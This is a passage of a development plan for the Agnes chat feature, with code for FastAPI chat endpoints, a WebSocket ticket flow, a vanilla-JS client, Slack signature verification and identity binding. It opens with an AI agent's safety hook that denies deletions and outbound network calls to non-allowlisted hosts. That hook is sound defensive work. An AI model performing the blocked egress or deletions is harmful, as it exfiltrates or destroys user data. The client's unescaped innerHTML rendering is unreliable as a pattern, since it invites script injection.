                "Refusing to delete from persistent workspace/snapshots or workspace/scripts. "
                "Use a fresh path or ask the user explicitly.",
        }

    # Outbound network — block hosts outside allowlist
    for url in re.findall(r"https?://([^/\s'\"]+)", cmd):
        host = url.split(":")[0]
        if host not in ALLOWED_HOSTS:
            return {
                "permissionDecision": "deny",
                "permissionDecisionReason":
                    f"Outbound network to {host!r} is not in the Agnes egress allowlist. "
                    "Allowed: " + ", ".join(sorted(ALLOWED_HOSTS)),
            }

    # Admin mutations need user confirmation
    if any(lower.startswith(p) for p in ADMIN_PROMPT_PREFIXES):
        return {
            "permissionDecision": "ask",
            "permissionDecisionReason":
                "This command mutates the Agnes access-control layer; confirm before running.",
        }

    return {"permissionDecision": "allow"}


def main() -> None:
    try:
        payload = json.loads(sys.stdin.read() or "{}")
    except json.JSONDecodeError:
        payload = {}
    sys.stdout.write(json.dumps(_decide(payload)))
    sys.stdout.flush()


if __name__ == "__main__":
    main()
```

- [ ] **Step 3: Settings.json registers hook**

```json
{
  "$schema": "https://schemas.claude.com/claude-code/settings.json",
  "hooks": {
    "PreToolUse": [
      {"matcher": "Bash", "command": "$CLAUDE_PROJECT_DIR/.claude/hooks/pre_tool_use.py"}
    ]
  }
}
```

Write to `app/initial_workspace_default/.claude/settings.json`.

- [ ] **Step 4: Run, expect green, commit**

```
.venv/bin/pytest tests/test_default_pre_tool_use_hook.py -v
git add app/initial_workspace_default/.claude/hooks/pre_tool_use.py \
        app/initial_workspace_default/.claude/settings.json \
        tests/test_default_pre_tool_use_hook.py
git commit -m "feat(chat): default PreToolUse safety hook bundled in workspace template"
```

---

## Phase 8 — Chat REST + WebSocket API

`app/api/chat.py` exposes REST session CRUD and a WS stream. Auth =
existing `require_login`. WS ticket is single-use, expires in 60s.

### Task 8.1: REST endpoints + WS ticket issuance

**Files:**
- Create: `app/api/chat.py`
- Modify: `app/auth/access.py` (add `mint_ws_ticket` / `mint_session_jwt` helpers)
- Test:   `tests/test_chat_api.py`

- [ ] **Step 1: Failing tests for POST + GET + DELETE**

```python
# tests/test_chat_api.py
from fastapi.testclient import TestClient

# Devin: the test client wiring follows the existing pattern in
# tests/test_admin_api.py or tests/conftest.py. Use the same login fixture.

def test_create_web_session(api_client: TestClient, logged_in_user):
    r = api_client.post("/api/chat/sessions", json={"surface": "web"})
    assert r.status_code == 200
    data = r.json()
    assert data["id"].startswith("chat_")
    assert data["ws_url"].endswith("/stream")
    assert data["ws_ticket"]


def test_list_sessions(api_client: TestClient, logged_in_user):
    api_client.post("/api/chat/sessions", json={"surface": "web"})
    r = api_client.get("/api/chat/sessions")
    assert r.status_code == 200
    arr = r.json()
    assert len(arr) == 1
    assert arr[0]["surface"] == "web"


def test_get_messages_empty(api_client: TestClient, logged_in_user):
    c = api_client.post("/api/chat/sessions", json={"surface": "web"}).json()
    r = api_client.get(f"/api/chat/sessions/{c['id']}/messages")
    assert r.status_code == 200
    assert r.json() == []


def test_archive_session(api_client: TestClient, logged_in_user):
    c = api_client.post("/api/chat/sessions", json={"surface": "web"}).json()
    r = api_client.delete(f"/api/chat/sessions/{c['id']}")
    assert r.status_code == 200
    r2 = api_client.get("/api/chat/sessions")
    assert r2.json() == []  # archived sessions excluded


def test_create_when_disabled(api_client_chat_disabled, logged_in_user):
    r = api_client_chat_disabled.post("/api/chat/sessions", json={"surface": "web"})
    assert r.status_code == 503
    assert r.json()["detail"]["kind"] == "chat_disabled"
```

- [ ] **Step 2: Implement `app/api/chat.py`**

```python
"""FastAPI chat REST + WebSocket endpoints."""
from __future__ import annotations

import logging
import secrets
import time
from typing import Optional

from fastapi import APIRouter, Depends, HTTPException, WebSocket, WebSocketDisconnect
from pydantic import BaseModel

from app.auth.access import require_login
from app.chat.manager import ChatManager, ConcurrencyCapHit, SessionNotFound
from app.chat.persistence import ChatRepository
from app.chat.types import Surface

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/api/chat", tags=["chat"])


# In-memory ticket store. Per spec: single-worker constraint enforced at
# startup; HA needs ticket store in DuckDB or Redis (future spec).
_TICKETS: dict[str, tuple[str, str, float]] = {}  # ticket -> (chat_id, user_email, expires_at)
_TICKET_TTL_SEC = 60


def _issue_ticket(chat_id: str, user_email: str) -> str:
    ticket = secrets.token_urlsafe(32)
    _TICKETS[ticket] = (chat_id, user_email, time.time() + _TICKET_TTL_SEC)
    return ticket


def _consume_ticket(ticket: str) -> Optional[tuple[str, str]]:
    rec = _TICKETS.pop(ticket, None)
    if rec is None:
        return None
    chat_id, user_email, expires_at = rec
    if time.time() > expires_at:
        return None
    return chat_id, user_email


class CreateSessionBody(BaseModel):
    surface: str = "web"
    title: Optional[str] = None


def _get_manager(request) -> ChatManager:
    mgr = getattr(request.app.state, "chat_manager", None)
    if mgr is None:
        raise HTTPException(
            status_code=503,
            detail={"kind": "chat_disabled", "hint": "Operator must enable chat.enabled in instance.yaml"},
        )
    return mgr


def _get_repo(request) -> ChatRepository:
    return request.app.state.chat_repo


@router.post("/sessions")
async def create_session(body: CreateSessionBody, request, user=Depends(require_login)):
    mgr = _get_manager(request)
    try:
        s = await mgr.create_session(
            user_email=user.email, surface=Surface(body.surface), title=body.title,
        )
    except ConcurrencyCapHit as exc:
        raise HTTPException(status_code=429, detail={"kind": "concurrency_cap", "hint": str(exc)})
    ticket = _issue_ticket(s.id, user.email)
    return {
        "id": s.id, "surface": s.surface.value, "title": s.title,
        "ws_ticket": ticket,
        "ws_url": f"/api/chat/sessions/{s.id}/stream?ticket={ticket}",
    }


@router.get("/sessions")
async def list_sessions(request, user=Depends(require_login)):
    repo = _get_repo(request)
    rows = repo.list_sessions(user.email)
    return [
        {
            "id": s.id, "surface": s.surface.value, "title": s.title,
            "started_at": s.started_at.isoformat(),
            "last_message_at": s.last_message_at.isoformat() if s.last_message_at else None,
            "message_count": s.message_count,
        }
        for s in rows
    ]


@router.get("/sessions/{chat_id}/messages")
async def list_messages(chat_id: str, request, after_id: Optional[str] = None, user=Depends(require_login)):
    repo = _get_repo(request)
    s = repo.get_session(chat_id)
    if s is None or s.user_email != user.email:
        raise HTTPException(404)
    msgs = repo.list_messages(chat_id, after_id=after_id)
    return [
        {
            "id": m.id, "role": m.role, "content": m.content,
            "tool_calls": m.tool_calls, "created_at": m.created_at.isoformat(),
        }
        for m in msgs
    ]


@router.delete("/sessions/{chat_id}")
async def archive_session(chat_id: str, request, user=Depends(require_login)):
    repo = _get_repo(request)
    s = repo.get_session(chat_id)
    if s is None or s.user_email != user.email:
        raise HTTPException(404)
    mgr = _get_manager(request)
    try:
        await mgr.kill(chat_id, reason="user_archive")
    except Exception:
        logger.exception("kill on archive failed")
    repo.archive_session(chat_id)
    return {"ok": True}


@router.websocket("/sessions/{chat_id}/stream")
async def ws_stream(ws: WebSocket, chat_id: str, ticket: str):
    consumed = _consume_ticket(ticket)
    if consumed is None or consumed[0] != chat_id:
        await ws.close(code=4401, reason="invalid_or_expired_ticket")
        return
    chat_id_v, user_email = consumed

    await ws.accept()
    mgr: ChatManager = ws.app.state.chat_manager  # set in startup hook

    async def reader_loop() -> None:
        try:
            while True:
                frame = await ws.receive_json()
                kind = frame.get("type")
                if kind == "user_msg":
                    await mgr.send_user_message(chat_id_v, frame.get("text", ""))
                elif kind == "cancel":
                    await mgr.cancel(chat_id_v)
        except WebSocketDisconnect:
            return

    try:
        import asyncio
        attach_task = asyncio.create_task(mgr.attach(chat_id_v, ws))
        await reader_loop()
        attach_task.cancel()
    except SessionNotFound:
        await ws.close(code=4404, reason="session_not_found")
```

- [ ] **Step 3: Implement helpers in `app/auth/access.py`**

Add:

```python
def mint_session_jwt(user_email: str, chat_id: str, *, ttl_seconds: int = 3600) -> str:
    """Mint a short-lived service JWT scoped to one chat session.

    Used by ChatManager._spawn_runner to inject AGNES_TOKEN into the
    subprocess env. Verified by the existing require_login dependency
    because it carries the same `sub` (user_email) claim.
    """
    import jwt  # already a dep
    now = int(time.time())
    payload = {
        "sub": user_email,
        "iat": now,
        "exp": now + ttl_seconds,
        "scope": "chat",
        "session_id": chat_id,
    }
    secret = os.environ["AGNES_JWT_SECRET"]
    return jwt.encode(payload, secret, algorithm="HS256")
```

The existing `require_login` already verifies `exp` and `sub`; the
`scope` claim is informational (recorded in audit when chat tool
calls hit the API).

- [ ] **Step 4: Run + commit**

```
.venv/bin/pytest tests/test_chat_api.py -v
git add app/api/chat.py app/auth/access.py tests/test_chat_api.py
git commit -m "feat(chat): REST sessions API + WS ticket + session-scoped JWT helper"
```

### Task 8.2: WebSocket framing + backpressure smoke test

**Files:**
- Test: `tests/test_chat_api_ws.py`

- [ ] **Step 1: Add WS integration test**

```python
# tests/test_chat_api_ws.py
import asyncio
import json
import os

import pytest
from starlette.testclient import TestClient


def test_ws_token_streaming_with_fake_runner(api_client, logged_in_user, tmp_path, monkeypatch):
    # Force the fake-agent runner so we don't need an Anthropic key
    monkeypatch.setenv("AGNES_RUNNER_FAKE_AGENT", "1")
    monkeypatch.setenv("AGNES_JWT_SECRET", "dev-secret")

    create = api_client.post("/api/chat/sessions", json={"surface": "web"}).json()
    with api_client.websocket_connect(create["ws_url"]) as ws:
        first = ws.receive_json()
        assert first["type"] in ("ready", "runner_ready")
        ws.send_json({"type": "user_msg", "text": "hello"})
        # Pump frames until we see an assistant_message
        for _ in range(50):
            frame = ws.receive_json()
            if frame.get("type") == "assistant_message":
                assert "hello" in frame["content"]
                break
        else:
            raise AssertionError("never saw assistant_message")
```

- [ ] **Step 2: Run + commit**

```
.venv/bin/pytest tests/test_chat_api_ws.py -v
git add tests/test_chat_api_ws.py
git commit -m "test(chat): WS end-to-end with fake-agent runner"
```

---

## Phase 9 — Web chat UI

Vanilla JS + Jinja template, no React. Mirrors existing
`app/web/templates/admin_*.html` layout. WS over same-origin; ticket
included in URL query.

### Task 9.1: Route + Jinja template

**Files:**
- Create: `app/web/templates/chat.html`
- Modify: `app/web/router.py`
- Test:   `tests/test_chat_web_route.py`

- [ ] **Step 1: Test the route returns HTML**

```python
# tests/test_chat_web_route.py
def test_chat_route_html(api_client, logged_in_user):
    r = api_client.get("/chat")
    assert r.status_code == 200
    assert "text/html" in r.headers["content-type"]
    assert "<title>Agnes — Chat</title>" in r.text


def test_chat_route_redirects_when_disabled(api_client_chat_disabled, logged_in_user):
    r = api_client_chat_disabled.get("/chat", follow_redirects=False)
    assert r.status_code in (302, 307)
```

- [ ] **Step 2: Implement Jinja template**

```html
{# app/web/templates/chat.html #}
<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <title>Agnes — Chat</title>
  <link rel="stylesheet" href="/static/css/admin.css" />
  <link rel="stylesheet" href="/static/css/chat.css" />
  <script src="/static/vendor/marked.min.js"></script>
  <script src="/static/vendor/highlight.min.js"></script>
</head>
<body class="chat-body">
  <header class="topbar">
    <a href="/" class="brand">Agnes</a>
    <span class="user">{{ current_user.email }}</span>
  </header>
  <main class="chat-shell">
    <aside class="chat-sidebar">
      <button id="new-chat">+ New chat</button>
      <ul id="chat-list"></ul>
    </aside>
    <section class="chat-main">
      <div id="chat-status"></div>
      <div id="chat-messages" aria-live="polite"></div>
      <form id="chat-form">
        <textarea id="chat-input" placeholder="Ask Agnes…" rows="2"></textarea>
        <button type="submit">Send</button>
        <button type="button" id="cancel-btn" hidden>Stop</button>
      </form>
    </section>
  </main>
  <script type="module" src="/static/js/chat.js"></script>
</body>
</html>
```

- [ ] **Step 3: Add route**

In `app/web/router.py`:

```python
@router.get("/chat", response_class=HTMLResponse)
async def chat_page(request, user=Depends(require_login)):
    if not request.app.state.chat_config.enabled:
        return RedirectResponse("/")
    return templates.TemplateResponse("chat.html", {"request": request, "current_user": user})
```

- [ ] **Step 4: Run + commit**

```
.venv/bin/pytest tests/test_chat_web_route.py -v
git add app/web/templates/chat.html app/web/router.py tests/test_chat_web_route.py
git commit -m "feat(chat): /chat route + Jinja shell"
```

### Task 9.2: Chat client JS (WS streaming + sidebar)

**Files:**
- Create: `app/static/js/chat.js`
- Create: `app/static/css/chat.css`

- [ ] **Step 1: Implement chat.js**

```javascript
// app/static/js/chat.js
const $ = (id) => document.getElementById(id);

let ws = null;
let currentChatId = null;
let inFlightToolCalls = new Map();

async function api(path, init = {}) {
  const r = await fetch(path, {
    headers: { "Content-Type": "application/json" },
    credentials: "same-origin",
    ...init,
  });
  if (!r.ok) throw new Error(`${r.status} ${r.statusText}`);
  return r.json();
}

async function loadSidebar() {
  const list = await api("/api/chat/sessions");
  const ul = $("chat-list");
  ul.innerHTML = "";
  for (const s of list) {
    const li = document.createElement("li");
    li.textContent = s.title || s.id;
    li.dataset.id = s.id;
    li.onclick = () => openSession(s.id);
    ul.appendChild(li);
  }
}

async function newChat() {
  const created = await api("/api/chat/sessions", {
    method: "POST",
    body: JSON.stringify({ surface: "web" }),
  });
  await loadSidebar();
  openSession(created.id, created.ws_url);
}

async function openSession(chatId, wsUrlOverride) {
  if (ws) { ws.close(); ws = null; }
  currentChatId = chatId;
  $("chat-messages").innerHTML = "";
  $("chat-status").textContent = "";

  // Hydrate history
  const history = await api(`/api/chat/sessions/${chatId}/messages`);
  for (const m of history) renderMessage(m);

  // Open WS; if no override, mint a fresh ticket via POST
  let wsUrl = wsUrlOverride;
  if (!wsUrl) {
    const created = await api("/api/chat/sessions", {
      method: "POST",
      body: JSON.stringify({ surface: "web", title: null }),
    });
    if (created.id !== chatId) {
      // server returned a deduped session — re-open that one
      currentChatId = created.id;
    }
    wsUrl = created.ws_url;
  }

  const proto = location.protocol === "https:" ? "wss" : "ws";
  ws = new WebSocket(`${proto}://${location.host}${wsUrl}`);
  ws.onmessage = (ev) => handleFrame(JSON.parse(ev.data));
  ws.onclose = () => { $("chat-status").textContent = "Disconnected."; };
}

function handleFrame(frame) {
  switch (frame.type) {
    case "ready":
    case "runner_ready":
      $("chat-status").textContent = "Connected.";
      break;
    case "token":
      appendToken(frame.text);
      break;
    case "tool_call":
      renderToolCallStart(frame);
      break;
    case "tool_result":
      renderToolCallEnd(frame);
      break;
    case "assistant_message":
      finalizeAssistantMessage(frame);
      break;
    case "cancelled":
      $("chat-status").textContent = `Cancelled tool: ${frame.tool || ""}`;
      break;
    case "error":
      $("chat-status").textContent = `Error: ${frame.kind} (${frame.message || ""})`;
      break;
    case "done":
      $("cancel-btn").hidden = true;
      break;
  }
}

function renderMessage(m) {
  const div = document.createElement("div");
  div.className = `msg msg-${m.role}`;
  div.innerHTML = marked.parse(m.content || "");
  if (m.tool_calls && m.tool_calls.length) {
    for (const tc of m.tool_calls) {
      const det = document.createElement("details");
      det.innerHTML = `<summary>tool: ${tc.tool}</summary>
        <pre><code>${JSON.stringify(tc.args, null, 2)}</code></pre>`;
      div.appendChild(det);
    }
  }
  $("chat-messages").appendChild(div);
}

let currentAssistantDiv = null;
function appendToken(text) {
  if (!currentAssistantDiv) {
    currentAssistantDiv = document.createElement("div");
    currentAssistantDiv.className = "msg msg-assistant streaming";
    $("chat-messages").appendChild(currentAssistantDiv);
  }
  currentAssistantDiv.textContent += text;
  currentAssistantDiv.scrollIntoView({ block: "end" });
}

function finalizeAssistantMessage(frame) {
  if (currentAssistantDiv) {
    currentAssistantDiv.classList.remove("streaming");
    currentAssistantDiv.innerHTML = marked.parse(frame.content || currentAssistantDiv.textContent);
    currentAssistantDiv = null;
  } else {
    renderMessage({ role: "assistant", content: frame.content, tool_calls: frame.tool_calls });
  }
}

function renderToolCallStart(frame) {
  const det = document.createElement("details");
  det.open = false;
  det.dataset.tool = frame.tool;
  det.innerHTML = `<summary>⏳ tool: ${frame.tool}</summary>
    <pre><code>${JSON.stringify(frame.args, null, 2)}</code></pre>`;
  $("chat-messages").appendChild(det);
  inFlightToolCalls.set(frame.tool, det);
  $("cancel-btn").hidden = false;
}

function renderToolCallEnd(frame) {
  const det = inFlightToolCalls.get(frame.tool);
  if (det) {
    det.querySelector("summary").textContent = `✓ tool: ${frame.tool}`;
    const pre = document.createElement("pre");
    pre.innerHTML = `<code>${JSON.stringify(frame.result, null, 2).slice(0, 4000)}</code>`;
    det.appendChild(pre);
    inFlightToolCalls.delete(frame.tool);
  }
}

$("new-chat").onclick = newChat;
$("chat-form").onsubmit = (e) => {
  e.preventDefault();
  if (!ws || ws.readyState !== 1) return;
  const text = $("chat-input").value.trim();
  if (!text) return;
  renderMessage({ role: "user", content: text });
  ws.send(JSON.stringify({ type: "user_msg", text }));
  $("chat-input").value = "";
};
$("cancel-btn").onclick = () => ws?.send(JSON.stringify({ type: "cancel" }));

(async () => {
  await loadSidebar();
})();
```

- [ ] **Step 2: Implement chat.css**

```css
/* app/static/css/chat.css */
.chat-body { margin: 0; font-family: ui-sans-serif, system-ui, sans-serif; }
.topbar { display: flex; justify-content: space-between; align-items: center;
          padding: .75rem 1rem; border-bottom: 1px solid #ddd; }
.chat-shell { display: grid; grid-template-columns: 240px 1fr; height: calc(100vh - 56px); }
.chat-sidebar { border-right: 1px solid #eee; padding: 1rem; overflow: auto; }
.chat-sidebar button { width: 100%; padding: .5rem; margin-bottom: 1rem; }
.chat-sidebar ul { list-style: none; padding: 0; margin: 0; }
.chat-sidebar li { padding: .5rem; border-radius: 4px; cursor: pointer; }
.chat-sidebar li:hover { background: #f5f5f5; }
.chat-main { display: flex; flex-direction: column; }
#chat-messages { flex: 1; overflow: auto; padding: 1rem; }
.msg { padding: .5rem 1rem; margin-bottom: .75rem; border-radius: 6px; max-width: 80ch; }
.msg-user { background: #e8f0fe; align-self: flex-end; }
.msg-assistant { background: #f5f5f5; }
.msg-assistant.streaming::after { content: "▮"; }
#chat-form { display: flex; gap: .5rem; padding: 1rem; border-top: 1px solid #eee; }
#chat-input { flex: 1; font: inherit; padding: .5rem; }
#chat-status { padding: .25rem 1rem; font-size: .875rem; color: #666; }
details { margin: .5rem 0; padding: .5rem; background: #fafafa; border-radius: 4px; }
```

- [ ] **Step 3: Playwright E2E**

```python
# tests/e2e/test_chat_web.py
import os
import pytest
from playwright.sync_api import sync_playwright


@pytest.mark.skipif(not os.environ.get("AGNES_E2E"), reason="E2E disabled")
def test_chat_e2e_send_and_receive():
    with sync_playwright() as p:
        browser = p.chromium.launch()
        page = browser.new_page()
        # Login flow uses existing helper at /test-login fixture endpoint
        page.goto("http://localhost:8000/test-login?email=e2e@x")
        page.goto("http://localhost:8000/chat")
        page.click("#new-chat")
        page.fill("#chat-input", "hello")
        page.click("#chat-form button[type=submit]")
        page.wait_for_selector(".msg-assistant", timeout=15000)
        text = page.text_content(".msg-assistant")
        assert "hello" in text.lower() or "echo" in text.lower()
        browser.close()
```

- [ ] **Step 4: Commit**

```
git add app/static/js/chat.js app/static/css/chat.css tests/e2e/test_chat_web.py
git commit -m "feat(chat): web chat client — WS streaming, sidebar, tool-call blocks"
```

---

## Phase 10 — Slack adapter

`services/slack_bot/` mirrors `services/telegram_bot/`. Slack Events
API webhook + verification-code identity binding + thread → session
mapping. HMAC signature verification on every webhook call.

### Task 10.1: HMAC verification + Events webhook scaffold

**Files:**
- Create: `services/slack_bot/__init__.py`
- Create: `services/slack_bot/sigverify.py`
- Create: `services/slack_bot/events.py`
- Create: `app/api/slack.py`
- Test:   `tests/test_slack_sigverify.py`

- [ ] **Step 1: Failing test for sig verify**

```python
# tests/test_slack_sigverify.py
import hashlib
import hmac
import time

from services.slack_bot.sigverify import verify_slack_signature


def test_accepts_valid():
    secret = "s3cret"
    body = b'{"type":"event_callback"}'
    ts = str(int(time.time()))
    base = f"v0:{ts}:".encode() + body
    sig = "v0=" + hmac.new(secret.encode(), base, hashlib.sha256).hexdigest()
    assert verify_slack_signature(secret, ts, sig, body) is True


def test_rejects_old_timestamp():
    secret = "s3cret"
    body = b"{}"
    ts = str(int(time.time()) - 600)  # 10 min old
    base = f"v0:{ts}:".encode() + body
    sig = "v0=" + hmac.new(secret.encode(), base, hashlib.sha256).hexdigest()
    assert verify_slack_signature(secret, ts, sig, body) is False


def test_rejects_bad_sig():
    assert verify_slack_signature("s", "0", "v0=bad", b"{}") is False
```

- [ ] **Step 2: Implement `services/slack_bot/sigverify.py`**

```python
"""Slack signing-secret HMAC verification (per Slack Events API spec)."""
from __future__ import annotations

import hashlib
import hmac
import time

MAX_SKEW_SECONDS = 60 * 5


def verify_slack_signature(
    signing_secret: str, timestamp: str, signature: str, body: bytes,
) -> bool:
    try:
        ts_int = int(timestamp)
    except (TypeError, ValueError):
        return False
    if abs(time.time() - ts_int) > MAX_SKEW_SECONDS:
        return False
    base = f"v0:{timestamp}:".encode() + body
    expected = "v0=" + hmac.new(signing_secret.encode(), base, hashlib.sha256).hexdigest()
    return hmac.compare_digest(expected, signature)
```

- [ ] **Step 3: Implement Events router skeleton**

```python
# app/api/slack.py
from __future__ import annotations

import logging
import os
from typing import Optional

from fastapi import APIRouter, HTTPException, Request

from services.slack_bot.events import dispatch_event
from services.slack_bot.sigverify import verify_slack_signature

logger = logging.getLogger(__name__)
router = APIRouter(prefix="/api/slack", tags=["slack"])


@router.post("/events")
async def slack_events(request: Request):
    body = await request.body()
    ts = request.headers.get("X-Slack-Request-Timestamp", "")
    sig = request.headers.get("X-Slack-Signature", "")
    secret = os.environ.get("SLACK_SIGNING_SECRET", "")
    if not secret or not verify_slack_signature(secret, ts, sig, body):
        raise HTTPException(401, "bad_signature")
    payload = await request.json()
    if payload.get("type") == "url_verification":
        return {"challenge": payload["challenge"]}
    if payload.get("type") == "event_callback":
        await dispatch_event(request.app, payload["event"])
        return {"ok": True}
    return {"ok": True}
```

- [ ] **Step 4: Implement event dispatch stub**

```python
# services/slack_bot/events.py
from __future__ import annotations

import logging
from typing import Any

from services.slack_bot.binding import lookup_user_email
from services.slack_bot.sender import send_thread_reply

logger = logging.getLogger(__name__)


async def dispatch_event(app, event: dict[str, Any]) -> None:
    etype = event.get("type")
    if etype == "message":
        await _handle_dm(app, event)
    elif etype == "app_mention":
        await _handle_mention(app, event)


async def _handle_dm(app, event: dict) -> None:
    if event.get("channel_type") != "im" or event.get("bot_id"):
        return
    slack_user_id = event.get("user")
    text = event.get("text", "")
    repo = app.state.chat_repo
    user_email = lookup_user_email(repo, slack_user_id)
    if user_email is None:
        await send_thread_reply(
            event["channel"], event["ts"],
            "I don't know who you are yet. Please bind your Slack to Agnes "
            "via the /setup page; you'll get a verification code to paste.",
        )
        return
    mgr = app.state.chat_manager
    from app.chat.types import Surface
    session = await mgr.create_session(
        user_email=user_email, surface=Surface.SLACK_DM,
        slack_channel_id=event["channel"],
    )
    await mgr.send_user_message(session.id, text)


async def _handle_mention(app, event: dict) -> None:
    # MVP: scope = DM only (per spec defaults). Stub for follow-up.
    return
```

- [ ] **Step 5: Run + commit**

```
.venv/bin/pytest tests/test_slack_sigverify.py -v
git add services/slack_bot/__init__.py services/slack_bot/sigverify.py \
        services/slack_bot/events.py app/api/slack.py tests/test_slack_sigverify.py
git commit -m "feat(slack): Events API webhook + HMAC verification + DM dispatch"
```

### Task 10.2: Identity binding (verification code DM flow)

**Files:**
- Create: `services/slack_bot/binding.py`
- Create: `services/slack_bot/sender.py`
- Modify: `app/api/slack.py` (add `/bind` endpoint)
- Test:   `tests/test_slack_bot.py`

- [ ] **Step 1: Failing test for binding flow**

```python
# tests/test_slack_bot.py
from pathlib import Path

import pytest
from src.db import migrate, open_db

from services.slack_bot.binding import (
    issue_verification_code,
    lookup_user_email,
    redeem_verification_code,
)


@pytest.fixture
def conn(tmp_path: Path):
    c = open_db(tmp_path / "system.duckdb")
    migrate(c)
    c.execute("INSERT INTO users(email, display_name) VALUES ('u@x', 'U')")
    return c


def test_issue_and_redeem(conn):
    code = issue_verification_code(conn, slack_user_id="U123")
    assert len(code) == 6 and code.isdigit()
    ok = redeem_verification_code(conn, user_email="u@x", code=code)
    assert ok is True
    assert lookup_user_email(_RepoStub(conn), "U123") == "u@x"


def test_redeem_rejects_bad_code(conn):
    issue_verification_code(conn, slack_user_id="U123")
    assert redeem_verification_code(conn, user_email="u@x", code="000000") is False


def test_redeem_rejects_expired(conn, monkeypatch):
    import services.slack_bot.binding as b
    monkeypatch.setattr(b, "_CODE_TTL_SECONDS", -1)
    code = issue_verification_code(conn, slack_user_id="U123")
    assert redeem_verification_code(conn, user_email="u@x", code=code) is False


class _RepoStub:
    def __init__(self, conn): self._conn = conn
```

- [ ] **Step 2: Implement `services/slack_bot/binding.py`**

```python
"""Slack user ↔ Agnes user binding via 6-digit verification code.

Code is generated when a Slack user DMs the bot for the first time;
they paste it at /setup while logged in to bind the IDs.
"""
from __future__ import annotations

import secrets
import time
from datetime import datetime, timezone
from typing import Optional

import duckdb

_CODE_TTL_SECONDS = 10 * 60


def _ensure_table(conn: duckdb.DuckDBPyConnection) -> None:
    conn.execute(
        "CREATE TABLE IF NOT EXISTS slack_binding_codes ("
        " code VARCHAR PRIMARY KEY,"
        " slack_user_id VARCHAR NOT NULL,"
        " issued_at TIMESTAMP NOT NULL"
        ")"
    )
    # users table is assumed to exist; add a nullable slack_user_id column
    cols = {r[0] for r in conn.execute("PRAGMA table_info(users)").fetchall()}
    if "slack_user_id" not in cols:
        conn.execute("ALTER TABLE users ADD COLUMN slack_user_id VARCHAR")


def issue_verification_code(conn: duckdb.DuckDBPyConnection, *, slack_user_id: str) -> str:
    _ensure_table(conn)
    code = f"{secrets.randbelow(1_000_000):06d}"
    conn.execute(
        "INSERT INTO slack_binding_codes(code, slack_user_id, issued_at) VALUES (?, ?, ?)",
        [code, slack_user_id, datetime.now(timezone.utc)],
    )
    return code


def redeem_verification_code(
    conn: duckdb.DuckDBPyConnection, *, user_email: str, code: str,
) -> bool:
    _ensure_table(conn)
    row = conn.execute(
        "SELECT slack_user_id, issued_at FROM slack_binding_codes WHERE code = ?",
        [code],
    ).fetchone()
    if not row:
        return False
    slack_user_id, issued_at = row
    age = (datetime.now(timezone.utc) - issued_at).total_seconds()
    if age > _CODE_TTL_SECONDS:
        conn.execute("DELETE FROM slack_binding_codes WHERE code = ?", [code])
        return False
    conn.execute("UPDATE users SET slack_user_id = ? WHERE email = ?", [slack_user_id, user_email])
    conn.execute("DELETE FROM slack_binding_codes WHERE code = ?", [code])
    return True


def lookup_user_email(repo, slack_user_id: str) -> Optional[str]:
    row = repo._conn.execute(
        "SELECT email FROM users WHERE slack_user_id = ?", [slack_user_id]
    ).fetchone()
    return row[0] if row else None
```

- [ ] **Step 3: Implement sender**

```python
# services/slack_bot/sender.py
"""Outbound Slack API calls (chat.postMessage in a thread)."""
from __future__ import annotations

import logging
import os

import httpx

logger = logging.getLogger(__name__)

SLACK_API = "https://api.slack.com/v0"  # actual: https://slack.com/api


async def send_thread_reply(channel: str, thread_ts: str, text: str) -> None:
    token = os.environ.get("SLACK_BOT_TOKEN")
    if not token:
        logger.error("SLACK_BOT_TOKEN missing — cannot reply")
        return
    async with httpx.AsyncClient(timeout=10) as client:
        await client.post(
            "https://slack.com/api/chat.postMessage",
            headers={"Authorization": f"Bearer {token}"},
            json={"channel": channel, "thread_ts": thread_ts, "text": text},
        )
```

- [ ] **Step 4: Add `/bind` endpoint to `app/api/slack.py`**

```python
class BindBody(BaseModel):
    code: str


@router.post("/bind")
async def bind_slack(body: BindBody, request: Request, user=Depends(require_login)):
    from services.slack_bot.binding import redeem_verification_code
    repo = request.app.state.chat_repo
    ok = redeem_verification_code(repo._conn, user_email=user.email, code=body.code)
    if not ok:
        raise HTTPException(400, "invalid_or_expired_code")
    return {"ok": True}
```

- [ ] **Step 5: Commit**

```
.venv/bin/pytest tests/test_slack_bot.py -v
git add services/slack_bot/binding.py services/slack_bot/sender.py app/api/slack.py \
        tests/test_slack_bot.py
git commit -m "feat(slack): verification-code identity binding + thread reply"
```

### Task 10.3: Slack App manifest

**Files:**
- Create: `services/slack_bot/manifest.yaml`

- [ ] **Step 1: Write manifest**

```yaml
# services/slack_bot/manifest.yaml
# Slack App manifest. Operators paste this at api.slack.com/apps "From manifest"
# when installing Agnes for their workspace.
display_information:
  name: Agnes
  description: Ask Agnes data questions from Slack
  background_color: "#1a1a1a"
features:
  bot_user:
    display_name: Agnes
    always_online: false
  app_home:
    home_tab_enabled: false
    messages_tab_enabled: true
    messages_tab_read_only_enabled: false
oauth_config:
  scopes:
    bot:
      - app_mentions:read
      - chat:write
      - im:history
      - im:write
      - users:read
      - users:read.email
settings:
  event_subscriptions:
    request_url: "https://YOUR-AGNES-HOST/api/slack/events"
    bot_events:
      - app_mention
      - message.im
  interactivity:
    is_enabled: false
  org_deploy_enabled: false
  socket_mode_enabled: false
  token_rotation_enabled: false
```

- [ ] **Step 2: Commit**

```
git add services/slack_bot/manifest.yaml
git commit -m "feat(slack): App manifest for operator install"
```

---

## Phase 11 — Admin observability

`/admin/chat` shows active sessions + recent stderr + kill button. Live
log tail via WS.

### Task 11.1: Admin REST + template + tail WS

**Files:**
- Create: `app/api/admin_chat.py`
- Create: `app/web/templates/admin_chat.html`
- Test:   `tests/test_admin_chat.py`

- [ ] **Step 1: Failing test**

```python
# tests/test_admin_chat.py
def test_admin_lists_active_sessions(api_client, logged_in_admin, monkeypatch):
    create = api_client.post("/api/chat/sessions", json={"surface": "web"}).json()
    r = api_client.get("/admin/chat")
    assert r.status_code == 200
    data = r.json()
    assert any(s["id"] == create["id"] for s in data["sessions"])


def test_admin_kills_session(api_client, logged_in_admin):
    c = api_client.post("/api/chat/sessions", json={"surface": "web"}).json()
    r = api_client.delete(f"/admin/chat/{c['id']}")
    assert r.status_code == 200


def test_non_admin_forbidden(api_client, logged_in_user):
    r = api_client.get("/admin/chat")
    assert r.status_code == 403
```

- [ ] **Step 2: Implement `app/api/admin_chat.py`**

```python
"""Admin observability for chat sessions."""
from __future__ import annotations

import logging
from pathlib import Path

from fastapi import APIRouter, Depends, HTTPException, WebSocket, WebSocketDisconnect

